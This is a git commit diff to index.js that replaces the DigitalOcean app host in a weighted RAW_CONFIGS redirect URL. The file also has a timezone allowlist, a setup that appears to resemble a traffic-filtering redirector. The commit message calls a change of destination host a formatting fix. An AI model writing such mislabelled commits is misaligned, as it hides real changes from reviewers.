d4b777fc4d1a67cd92ad6867b7117e8d192904cf
paalakash <palaksh452@gmail.com>
2026-06-26 13:37:04 +0530

    Fix URL formatting in RAW_CONFIGS

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://inn-lobster-app-pud9n.ondigitalocean.app/Win0codejInfowj2n/index.html", weight: 1.0 }
+    { url: "https://in-urchin-app-uib7y.ondigitalocean.app/Win0codejInfowj2n/index.html", weight: 1.0 }
 
 ];
 
